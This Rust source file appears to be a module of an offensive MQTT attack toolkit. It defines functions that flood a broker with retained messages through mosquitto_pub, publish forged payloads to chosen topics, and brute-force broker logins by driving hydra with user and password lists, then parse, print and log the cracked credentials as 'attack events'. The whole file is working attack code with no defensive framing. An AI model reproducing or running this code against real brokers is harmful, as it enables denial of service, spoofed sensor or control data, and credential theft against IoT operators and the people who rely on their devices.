use tokio::process::Command;
use colored::Colorize;
use tokio::io::{AsyncBufReadExt, BufReader};
use crate::data::logger;
use crate::data::models::CapturedCredential;

pub async fn flood_broker(broker: &str, port: u16, topic: &str, count: u32) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", format!("• Flooding MQTT broker at {}:{} on topic '{}' with {} messages...", broker, port, topic, count).blue());

    let mut mosquitto_pub_command = Command::new("mosquitto_pub");
    mosquitto_pub_command
        .arg("-h").arg(broker)
        .arg("-p").arg(port.to_string())
        .arg("-t").arg(topic)
        .arg("-m").arg("flood_message")
        .arg("-r");

    if count == 0 {
        println!("{}", "  Sending messages continuously. Press Ctrl+C to stop.".dimmed());
    } else {
        mosquitto_pub_command.arg("-l").arg(count.to_string());
    }

    let output = mosquitto_pub_command.output().await?;

    if output.status.success() {
        println!("{}", format!("• MQTT broker flooded successfully ({} messages sent).", count).green());
        logger::log_attack_event("mqtt_flood", "success", &format!("Flooded {} messages to {}:{}/{}", count, broker, port, topic)).await;
    } else {
        eprintln!("{}", "• MQTT broker flooding failed.".red());
        eprintln!("  Stderr: {}", String::from_utf8_lossy(&output.stderr));
        logger::log_attack_event("mqtt_flood", "failed", &format!("Flooding {}:{}/{} failed: {}", broker, port, topic, String::from_utf8_lossy(&output.stderr))).await;
    }

    Ok(())
}

pub async fn fake_publish(broker: &str, port: u16, topic: &str, payload: &str, count: u32) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", format!("• Publishing fake data to MQTT broker at {}:{} on topic '{}'...", broker, port, topic).blue());

    let mut mosquitto_pub_command = Command::new("mosquitto_pub");
    mosquitto_pub_command
        .arg("-h").arg(broker)
        .arg("-p").arg(port.to_string())
        .arg("-t").arg(topic)
        .arg("-m").arg(payload);

    if count == 0 {
        println!("{}", "  Publishing continuously. Press Ctrl+C to stop.".dimmed());
        mosquitto_pub_command.arg("-r");
    } else {
        mosquitto_pub_command.arg("-l").arg(count.to_string());
    }

    let output = mosquitto_pub_command.output().await?;

    if output.status.success() {
        println!("{}", format!("• Fake data published successfully ({} messages sent).", count).green());
        logger::log_attack_event("mqtt_fake_publish", "success", &format!("Published {} fake messages to {}:{}/{}. Payload: {}", count, broker, port, topic, payload)).await;
    } else {
        eprintln!("{}", "• Fake data publishing failed.".red());
        eprintln!("  Stderr: {}", String::from_utf8_lossy(&output.stderr));
        logger::log_attack_event("mqtt_fake_publish", "failed", &format!("Fake publish to {}:{}/{} failed: {}", broker, port, topic, String::from_utf8_lossy(&output.stderr))).await;
    }

    Ok(())
}

pub async fn brute_force_mqtt(broker: &str, port: u16, users_file: &str, passwords_file: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", format!("• Brute-forcing MQTT broker at {}:{}...", broker, port).blue());

    let mut hydra_command = Command::new("hydra");
    hydra_command
        .arg("-L").arg(users_file)
        .arg("-P").arg(passwords_file)
        .arg(format!("{}:{}", broker, port))
        .arg("mqtt");

    println!("{}", format!("  Executing: hydra -L {} -P {} {}:{} mqtt", users_file, passwords_file, broker, port).dimmed());

    let mut child = hydra_command.stdout(std::process::Stdio::piped()).spawn()?;
    let stdout = child.stdout.as_mut().expect("Failed to open stdout");
    let mut reader = BufReader::new(stdout).lines();

    let mut found_credentials: Vec<CapturedCredential> = Vec::new();

    while let Some(line) = reader.next_line().await? {
        println!("{}", format!("[Hydra Output]: {}", line).dimmed());
        if let Some(creds) = crate::parsers::cracker_parser::parse_hydra_mqtt_output(&line, broker, port) {
            println!("{}", format!("{} Found Credential: U:{} P:{}", "!!!".bold().red(), creds.username.bold(), creds.password.bold()));
            found_credentials.push(creds.clone());
            logger::log_attack_event("mqtt_brute_force", "credential_found", &format!("Found: {}:{} for MQTT broker {}:{}.", creds.username, creds.password, broker, port)).await;
        }
    }

    let status = child.wait().await?;
    println!("{}", format!("• Hydra finished with status: {}", status).blue());

    if found_credentials.is_empty() {
        println!("{}", "• No MQTT credentials found.".red());
        logger::log_attack_event("mqtt_brute_force", "completed", &format!("No credentials found for {}:{}.", broker, port)).await;
    } else {
        println!("{}", format!("• Successfully found {} MQTT credentials:", found_credentials.len()).green());
        for cred in &found_credentials {
            println!("  - U: {} P: {}", cred.username.bold(), cred.password.bold());
        }
        logger::log_attack_event(
            "mqtt_brute_force",
            "success",
            &format!("Found {} credentials for {}:{}.", found_credentials.len(), broker, port)).await;
    }

    Ok(())
}
